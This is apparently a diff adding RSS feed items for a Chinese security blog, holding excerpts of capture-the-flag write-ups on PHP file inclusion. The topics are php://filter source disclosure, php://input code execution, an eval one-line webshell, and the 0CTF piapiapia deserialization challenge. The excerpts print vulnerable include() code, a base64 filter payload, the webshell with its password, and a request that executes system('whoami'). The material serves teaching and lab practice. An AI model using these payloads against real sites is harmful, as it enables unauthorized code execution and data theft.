+				<link>http://127.0.0.1:1313/san-blog/posts/php/filter-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%AD%E8%AF%BB%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81/</link>
+				<pubDate>Fri, 05 Jun 2026 23:30:00 +0800</pubDate>
+				<guid>http://127.0.0.1:1313/san-blog/posts/php/filter-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%AD%E8%AF%BB%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81/</guid>
+				<description>&lt;h2 id=&#34;一phpfilter-是什么&#34;&gt;一、php://filter 是什么&lt;/h2&gt;&#xA;&lt;p&gt;&lt;code&gt;php://filter&lt;/code&gt; 是 PHP 提供的一种&lt;strong&gt;元封装协议（meta wrapper）&lt;/strong&gt;，用于在访问数据流时&lt;strong&gt;对数据进行过滤和转换&lt;/strong&gt;。&lt;/p&gt;&#xA;&lt;p&gt;与 &lt;code&gt;php://input&lt;/code&gt; 不同，&lt;code&gt;php://filter&lt;/code&gt; 的核心价值不在于执行代码，而在于&lt;strong&gt;以安全的方式读取文件内容&lt;/strong&gt;——尤其是当目标文件是 PHP 源码时。&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h2 id=&#34;二为什么需要-phpfilter-读取源码&#34;&gt;二、为什么需要 php://filter 读取源码&lt;/h2&gt;&#xA;&lt;p&gt;假设存在如下漏洞代码：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;];&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;include&lt;/span&gt;($file);  &lt;span style=&#34;color:#75715e&#34;&gt;// 用户可控！&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果我们直接传入 &lt;code&gt;?file=index.php&lt;/code&gt;，会发生什么？&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;GET /?file=index.php HTTP/1.1&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;include(&#39;index.php&#39;)&lt;/code&gt; 会&lt;strong&gt;执行&lt;/strong&gt; &lt;code&gt;index.php&lt;/code&gt; 中的 PHP 代码，而不是显示它的源码。页面上看到的仍然是渲染后的 HTML 输出。&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;那如何看到源码呢？&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;答案就是 &lt;code&gt;php://filter&lt;/code&gt;。利用它的编码过滤器，可以在 PHP 代码被执行前，先将文件内容进行 Base64 编码：&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?file=php://filter/read=convert.base64-encode/resource=index.php&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样返回的就是 Base64 编码后的源码字符串，而不是执行结果。&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h2 id=&#34;三基本语法结构&#34;&gt;三、基本语法结构&lt;/h2&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;php://filter/&amp;lt;action&amp;gt;=&amp;lt;filter_list&amp;gt;/resource=&amp;lt;target_file&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;&#xA;&#x9;&lt;thead&gt;&#xA;&#x9;&#x9;&#x9;&lt;tr&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;th&gt;组成部分&lt;/th&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;th&gt;说明&lt;/th&gt;&#xA;&#x9;&#x9;&#x9;&lt;/tr&gt;&#xA;&#x9;&lt;/thead&gt;&#xA;&#x9;&lt;tbody&gt;&#xA;&#x9;&#x9;&#x9;&lt;tr&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;&lt;code&gt;read=&lt;/code&gt; / &lt;code&gt;write=&lt;/code&gt;&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;对读取/写入的数据应用过滤器&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&lt;/tr&gt;&#xA;&#x9;&#x9;&#x9;&lt;tr&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;&lt;code&gt;filter_list&lt;/code&gt;&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;过滤器名称，支持链式调用（用 `&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&lt;/tr&gt;&#xA;&#x9;&#x9;&#x9;&lt;tr&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;&lt;code&gt;resource=&lt;/code&gt;&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;指定目标文件路径&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&lt;/tr&gt;&#xA;&#x9;&lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;h3 id=&#34;31-常用过滤器&#34;&gt;3.1 常用过滤器&lt;/h3&gt;&#xA;&lt;table&gt;&#xA;&#x9;&lt;thead&gt;&#xA;&#x9;&#x9;&#x9;&lt;tr&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;th&gt;过滤器&lt;/th&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;th&gt;功能&lt;/th&gt;&#xA;&#x9;&#x9;&#x9;&lt;/tr&gt;&#xA;&#x9;&lt;/thead&gt;&#xA;&#x9;&lt;tbody&gt;&#xA;&#x9;&#x9;&#x9;&lt;tr&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;&lt;code&gt;convert.base64-encode&lt;/code&gt;&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;Base64 编码&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&lt;/tr&gt;&#xA;&#x9;&#x9;&#x9;&lt;tr&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;&lt;code&gt;convert.base64-decode&lt;/code&gt;&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;Base64 解码&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&lt;/tr&gt;&#xA;&#x9;&#x9;&#x9;&lt;tr&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;&lt;code&gt;string.rot13&lt;/code&gt;&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;ROT13 编码&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&lt;/tr&gt;&#xA;&#x9;&#x9;&#x9;&lt;tr&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;&lt;code&gt;string.toupper&lt;/code&gt;&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;转大写&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&lt;/tr&gt;&#xA;&#x9;&#x9;&#x9;&lt;tr&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;&lt;code&gt;string.tolower&lt;/code&gt;&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;转小写&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&lt;/tr&gt;&#xA;&#x9;&#x9;&#x9;&lt;tr&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;&lt;code&gt;convert.iconv.*&lt;/code&gt;&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;字符集转换&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&lt;/tr&gt;&#xA;&#x9;&lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;hr&gt;&#xA;&lt;h2 id=&#34;四实战案例ctfhub-文件包含读源码&#34;&gt;四、实战案例：CTFHub 文件包含读源码&lt;/h2&gt;&#xA;&lt;h3 id=&#34;41-题目环境&#34;&gt;4.1 题目环境&lt;/h3&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;URL: http://&amp;lt;TARGET_IP&amp;gt;:&amp;lt;PORT&amp;gt;/&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;页面提示：&lt;/p&gt;</description>
+			</item>
+			<item>
+				<title>CTFHub 文件包含实战：利用一句话木马 getshell</title>
+				<link>http://127.0.0.1:1313/san-blog/posts/ctfhub-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-getshell/</link>
+				<pubDate>Fri, 05 Jun 2026 23:10:00 +0800</pubDate>
+				<guid>http://127.0.0.1:1313/san-blog/posts/ctfhub-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-getshell/</guid>
+				<description>&lt;h2 id=&#34;一题目信息&#34;&gt;一、题目信息&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;平台&lt;/strong&gt;：CTFHub&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;分类&lt;/strong&gt;：Skill / Web / RCE / 文件包含&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;考点&lt;/strong&gt;：PHP &lt;code&gt;include&lt;/code&gt; 函数、一句话木马、WebShell 连接&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;题目链接：&lt;a href=&#34;https://writeup.ctfhub.com/Skill/Web/RCE/5LdE3KFwGi6nxRDrvdB8AY.html&#34;&gt;https://writeup.ctfhub.com/Skill/Web/RCE/5LdE3KFwGi6nxRDrvdB8AY.html&lt;/a&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h2 id=&#34;二源码分析&#34;&gt;二、源码分析&lt;/h2&gt;&#xA;&lt;p&gt;进入题目后，直接给出了 PHP 源码：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;error_reporting&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);  &lt;span style=&#34;color:#75715e&#34;&gt;// 关闭报错显示&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;])) {                    &lt;span style=&#34;color:#75715e&#34;&gt;// 接收 file 参数&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;strpos&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;], &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;) {  &lt;span style=&#34;color:#75715e&#34;&gt;// 如果包含 &amp;#34;flag&amp;#34; 字符串&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hack&amp;#34;&lt;/span&gt;;                           &lt;span style=&#34;color:#75715e&#34;&gt;// 输出 hack，阻止访问&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;include&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;]);                &lt;span style=&#34;color:#75715e&#34;&gt;// 否则包含指定文件&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;逻辑梳理&#34;&gt;逻辑梳理&lt;/h3&gt;&#xA;&lt;table&gt;&#xA;&#x9;&lt;thead&gt;&#xA;&#x9;&#x9;&#x9;&lt;tr&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;th&gt;条件&lt;/th&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;th&gt;结果&lt;/th&gt;&#xA;&#x9;&#x9;&#x9;&lt;/tr&gt;&#xA;&#x9;&lt;/thead&gt;&#xA;&#x9;&lt;tbody&gt;&#xA;&#x9;&#x9;&#x9;&lt;tr&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;&lt;code&gt;file&lt;/code&gt; 参数包含 &lt;code&gt;&amp;quot;flag&amp;quot;&lt;/code&gt;&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;输出 &lt;code&gt;hack&lt;/code&gt;，包含失败&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&lt;/tr&gt;&#xA;&#x9;&#x9;&#x9;&lt;tr&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;&lt;code&gt;file&lt;/code&gt; 参数不含 &lt;code&gt;&amp;quot;flag&amp;quot;&lt;/code&gt;&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;执行 &lt;code&gt;include($file)&lt;/code&gt;&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&lt;/tr&gt;&#xA;&#x9;&lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;p&gt;&lt;strong&gt;核心考点&lt;/strong&gt;：&lt;code&gt;include()&lt;/code&gt; 函数的特性——&lt;strong&gt;不检查后缀，直接执行文件中的 PHP 代码&lt;/strong&gt;。&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h2 id=&#34;三发现突破口&#34;&gt;三、发现突破口&lt;/h2&gt;&#xA;&lt;p&gt;题目下方有一个提示链接，访问后得到 &lt;code&gt;shell.txt&lt;/code&gt;：&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://&amp;lt;TARGET_IP&amp;gt;:&amp;lt;PORT&amp;gt;/shell.txt&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;内容是一句话木马：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;eval&lt;/span&gt;($_REQUEST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ctfhub&amp;#39;&lt;/span&gt;]);&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;连接密码&lt;/strong&gt;：&lt;code&gt;ctfhub&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;原理&lt;/strong&gt;：&lt;code&gt;eval()&lt;/code&gt; 函数将 &lt;code&gt;$_REQUEST[&#39;ctfhub&#39;]&lt;/code&gt; 接收到的内容作为 PHP 代码执行&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;hr&gt;&#xA;&lt;h2 id=&#34;四解题思路&#34;&gt;四、解题思路&lt;/h2&gt;&#xA;&lt;h3 id=&#34;41-include-函数的关键特性&#34;&gt;4.1 include 函数的关键特性&lt;/h3&gt;&#xA;&lt;p&gt;假设 &lt;code&gt;index.php&lt;/code&gt; 中执行了：&lt;/p&gt;</description>
+			</item>
+			<item>
+				<title>php://input 文件包含漏洞利用：从原理到实战</title>
+				<link>http://127.0.0.1:1313/san-blog/posts/php/input-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98/</link>
+				<pubDate>Fri, 05 Jun 2026 22:50:00 +0800</pubDate>
+				<guid>http://127.0.0.1:1313/san-blog/posts/php/input-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98/</guid>
+				<description>&lt;h2 id=&#34;一phpinput-是什么&#34;&gt;一、php://input 是什么&lt;/h2&gt;&#xA;&lt;p&gt;&lt;code&gt;php://input&lt;/code&gt; 是 PHP 提供的&lt;strong&gt;只读数据流包装器（wrapper）&lt;/strong&gt;，它允许开发者直接访问 &lt;strong&gt;HTTP 请求的原始请求体（raw POST data）&lt;/strong&gt;。&lt;/p&gt;&#xA;&lt;p&gt;在文件包含漏洞的利用场景中，&lt;code&gt;php://input&lt;/code&gt; 是一把利器：当我们能够控制 &lt;code&gt;include()&lt;/code&gt; / &lt;code&gt;require()&lt;/code&gt; 等函数的文件参数时，传入 &lt;code&gt;php://input&lt;/code&gt;，PHP 就会把&lt;strong&gt;请求体中的内容当作 PHP 代码&lt;/strong&gt;来解析执行。&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;💡 关键前提：&lt;code&gt;allow_url_include = On&lt;/code&gt;（PHP 5.x 部分默认开启，PHP 7+ 默认关闭）&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;hr&gt;&#xA;&lt;h2 id=&#34;二利用原理&#34;&gt;二、利用原理&lt;/h2&gt;&#xA;&lt;p&gt;假设存在如下存在漏洞的代码：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;];&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;include&lt;/span&gt;($file);  &lt;span style=&#34;color:#75715e&#34;&gt;// 用户可控！&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当我们发送如下请求时：&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;GET /?file=php://input HTTP/1.1&#xA;Host: target.com&#xA;Content-Length: 29&#xA;&#xA;&amp;lt;?php system(&amp;#34;whoami&amp;#34;); ?&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行流程如下：&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;$_GET[&#39;file&#39;]&lt;/code&gt; 获取到字符串 &lt;code&gt;&amp;quot;php://input&amp;quot;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;include(&amp;quot;php://input&amp;quot;)&lt;/code&gt; 打开 &lt;code&gt;php://input&lt;/code&gt; 数据流&lt;/li&gt;&#xA;&lt;li&gt;PHP 从 HTTP 请求体中读取内容：&lt;code&gt;&amp;lt;?php system(&amp;quot;whoami&amp;quot;); ?&amp;gt;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;读取到的内容被当作 PHP 代码&lt;strong&gt;包含并执行&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;system(&amp;quot;whoami&amp;quot;)&lt;/code&gt; 被执行，返回当前系统用户&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;hr&gt;&#xA;&lt;h2 id=&#34;三实战案例ctfhub-文件包含&#34;&gt;三、实战案例：CTFHub 文件包含&lt;/h2&gt;&#xA;&lt;p&gt;下面结合一道 CTFHub 真题，完整走一遍利用流程。&lt;/p&gt;</description>
+			</item>
+			<item>
+				<title>[0CTF 2016]piapiapia</title>
+				<link>http://127.0.0.1:1313/san-blog/posts/0ctf-2016piapiapia/</link>
+				<pubDate>Fri, 30 May 2025 15:00:00 +0800</pubDate>
+				<guid>http://127.0.0.1:1313/san-blog/posts/0ctf-2016piapiapia/</guid>
+				<description>&lt;h2 id=&#34;题目信息&#34;&gt;题目信息&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;类型&lt;/strong&gt;：Web / PHP 反序列化&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;核心漏洞&lt;/strong&gt;：反序列化字符串逃逸 + 任意文件读取&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;源码泄露&lt;/strong&gt;：&lt;code&gt;www.zip&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;hr&gt;&#xA;&lt;h2 id=&#34;源码结构&#34;&gt;源码结构&lt;/h2&gt;&#xA;&lt;p&gt;下载源码后得到以下关键文件：&lt;/p&gt;&#xA;&lt;table&gt;&#xA;&#x9;&lt;thead&gt;&#xA;&#x9;&#x9;&#x9;&lt;tr&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;th&gt;文件&lt;/th&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;th&gt;作用&lt;/th&gt;&#xA;&#x9;&#x9;&#x9;&lt;/tr&gt;&#xA;&#x9;&lt;/thead&gt;&#xA;&#x9;&lt;tbody&gt;&#xA;&#x9;&#x9;&#x9;&lt;tr&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;&lt;code&gt;index.php&lt;/code&gt;&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;登录页面&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&lt;/tr&gt;&#xA;&#x9;&#x9;&#x9;&lt;tr&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;&lt;code&gt;register.php&lt;/code&gt;&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;注册页面&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&lt;/tr&gt;&#xA;&#x9;&#x9;&#x9;&lt;tr&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;&lt;code&gt;update.php&lt;/code&gt;&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;更新个人信息（文件上传 + 数据入库）&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&lt;/tr&gt;&#xA;&#x9;&#x9;&#x9;&lt;tr&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;&lt;code&gt;profile.php&lt;/code&gt;&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;展示个人信息（触发文件读取）&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&lt;/tr&gt;&#xA;&#x9;&#x9;&#x9;&lt;tr&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;&lt;code&gt;class.php&lt;/code&gt;&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;核心类（user + mysql）&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&lt;/tr&gt;&#xA;&#x9;&#x9;&#x9;&lt;tr&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;&lt;code&gt;config.php&lt;/code&gt;&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;td&gt;配置文件（含 flag）&lt;/td&gt;&#xA;&#x9;&#x9;&#x9;&lt;/tr&gt;&#xA;&#x9;&lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;hr&gt;&#xA;&lt;h2 id=&#34;漏洞分析&#34;&gt;漏洞分析&lt;/h2&gt;&#xA;&lt;h3 id=&#34;1-任意文件读取核心利用点&#34;&gt;1. 任意文件读取（核心利用点）&lt;/h3&gt;&#xA;&lt;p&gt;&lt;code&gt;profile.php&lt;/code&gt; 第 16 行：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$profile &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span 